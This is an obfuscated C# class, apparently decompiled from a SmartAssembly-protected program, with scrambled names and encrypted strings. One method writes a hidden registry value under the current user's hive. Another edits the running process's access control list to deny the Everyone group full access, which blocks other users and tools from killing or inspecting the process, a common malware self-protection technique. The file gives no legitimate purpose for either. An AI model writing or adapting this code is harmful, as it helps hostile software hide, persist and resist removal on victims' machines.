using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace xNvWsvlcqg;

internal sealed class BsMtgCfZGZIb
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr RzNkgFIIzgfM, int DTPldplbQxiK, [Out] byte[] lwitpJfpQLB, uint JFTrkSpfhLYX, out uint sUMLaQKexpfr);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr AAsapQqZyP, int afBTGFrJoeCuc, [In] byte[] KmxqwaXzbiB);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void WOgcWUfuObL(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107367603)));
			registryKey.SetValue(BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107368010)), getString_0(107396540));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor yPjkhmEgyThth(IntPtr intptr_0)
	{
		byte[] lwitpJfpQLB = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, lwitpJfpQLB, 0u, out var sUMLaQKexpfr);
		if ((long)sUMLaQKexpfr > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, lwitpJfpQLB = new byte[sUMLaQKexpfr], sUMLaQKexpfr, out sUMLaQKexpfr))
		{
			return null;
		}
		return new RawSecurityDescriptor(lwitpJfpQLB, 0);
	}

	private void AegoAQtkmpmVblu(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void KdyqBhPZOHruUj()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = yPjkhmEgyThth(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			AegoAQtkmpmVblu(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static BsMtgCfZGZIb()
	{
		Strings.CreateGetStringDelegate(typeof(BsMtgCfZGZIb));
	}
}
